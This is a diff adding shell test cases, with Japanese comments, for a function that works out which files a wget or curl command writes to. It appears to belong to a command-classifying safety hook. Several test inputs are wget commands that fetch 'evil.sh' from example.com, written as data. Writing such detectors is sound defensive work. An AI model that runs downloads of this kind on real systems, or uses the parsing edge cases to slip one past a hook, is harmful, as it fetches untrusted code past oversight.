@@ -291,6 +291,18 @@ case_classify() {
   assert_eq "HK-T15" "out.sh"    "$(wtargets 'wget -O out.sh http://example.com/evil.sh')"
   assert_eq "HK-T15" "log.txt,out.sh" "$(wtargets 'wget -q -o log.txt -O out.sh http://example.com/a')"
   assert_eq "HK-T15" "_"         "$(wtargets 'wget http://example.com/evil.sh')"
+  # ログの出力先が `-`（標準出力）でも、本体は依然として URL の basename に落ちる。
+  # `-` を種類を問わず「ファイルに落ちない」と数えると、末尾の `_` が消えて
+  # 実際に落ちてくる evil.sh が呼び手から見えなくなる
+  assert_eq "HK-T15" "_"         "$(wtargets 'wget -o - http://example.com/evil.sh')"
+  assert_eq "HK-T15" "_"         "$(wtargets 'wget --output-file=- http://example.com/evil.sh')"
+  assert_eq "HK-T15" "_"         "$(wtargets 'wget --append-output - http://example.com/evil.sh')"
+  # 本体の出力先が `-` なら標準出力なのでファイルの書き込み先は無い（上の 3 つの対照）
+  assert_eq "HK-T15" ""          "$(wtargets 'wget -O - http://example.com/evil.sh')"
+  assert_eq "HK-T15" ""          "$(wtargets 'wget --output-document=- http://example.com/evil.sh')"
+  assert_eq "HK-T15" ""          "$(wtargets 'curl -o - http://example.com/a')"
+  # ログが `-` でも本体を指定していればその指定が残る
+  assert_eq "HK-T15" "out.sh"    "$(wtargets 'wget -o - -O out.sh http://example.com/a')"
   assert_eq "HK-T15" "web"       "$(classify_all 'wget -O - http://example.com/a')"
   # curl の --libcurl もファイルを作る
   assert_eq "HK-T15" "write"     "$(classify_all 'curl --libcurl out.c http://example.com/a')"
